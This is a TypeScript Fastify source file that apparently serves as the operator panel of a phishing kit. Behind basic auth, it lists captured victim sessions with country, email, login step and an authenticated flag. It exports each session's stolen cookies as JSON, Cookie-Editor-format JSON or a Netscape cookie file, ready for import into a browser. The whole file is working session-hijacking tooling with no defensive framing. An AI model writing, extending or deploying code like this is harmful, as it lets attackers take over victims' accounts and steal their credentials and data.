import type { FastifyInstance } from 'fastify';
import { cfg } from './config.js';
import { q } from './db.js';

export async function adminRoutes(app: FastifyInstance) {
  app.addHook('onRequest', async (req, reply) => {
    const h = req.headers.authorization ?? '';
    const want = 'Basic ' + Buffer.from(`${cfg.adminUser}:${cfg.adminPass}`).toString('base64');
    if (h !== want) { reply.header('www-authenticate', 'Basic').code(401).send('auth'); }
  });

  app.get('/', async (_req, reply) => {
    reply.type('text/html').send(`<!doctype html><meta charset=utf8>
<title>ops</title>
<style>body{background:#070b12;color:#e8eef8;font:13px ui-monospace,monospace;margin:0;padding:16px}
tr{border-bottom:1px solid #1d2840}td{padding:6px 8px}a{color:#1199fa}button{background:#1199fa;border:0;color:#fff;padding:4px 8px;border-radius:4px;cursor:pointer}</style>
<h3>sessions</h3><table id=t></table>
<script>
const r=await fetch('api/sessions').then(x=>x.json());
t.innerHTML='<tr><th>id<th>when<th>cc<th>email<th>step<th>act</tr>'+r.map(s=>
'<tr><td>'+s.id.slice(0,8)+'<td>'+new Date(s.created).toLocaleTimeString()+'<td>'+(s.cc||'')+
'<td>'+(s.email||'')+'<td>'+(s.authed?'AUTHED':s.step)+'<td>'+
'<a href="cookie/'+s.id+'?fmt=json" target=_blank>json</a> '+
'<a href="cookie/'+s.id+'?fmt=editor" target=_blank>editor</a> '+
'<a href="cookie/'+s.id+'?fmt=netscape" target=_blank>netscape</a></tr>').join('');
</script>`);
  });

  app.get('/api/sessions', async () => q.all());

  app.get('/cookie/:id', async (req, reply) => {
    const { id } = req.params as any;
    const { fmt } = req.query as any;
    const row = q.get(id) as any;
    if (!row?.cookies) return reply.code(404).send('none');
    const cookies = JSON.parse(row.cookies);
    if (fmt === 'netscape') {
      const txt = cookies.map((c: any) =>
        [c.domain, c.domain.startsWith('.') ? 'TRUE' : 'FALSE', c.path, c.secure ? 'TRUE' : 'FALSE',
         Math.floor(c.expires > 0 ? c.expires : 0), c.name, c.value].join('\t')).join('\n');
      return reply.type('text/plain').header('content-disposition', `attachment; filename=${id}.txt`).send(txt);
    }
    if (fmt === 'editor') {
      const arr = cookies.map((c: any) => ({
        domain: c.domain, name: c.name, value: c.value, path: c.path,
        secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite,
        expirationDate: c.expires > 0 ? c.expires : undefined,
      }));
      return reply.type('application/json').send(JSON.stringify(arr, null, 2));
    }
    return reply.type('application/json').send(JSON.stringify(cookies, null, 2));
  });
}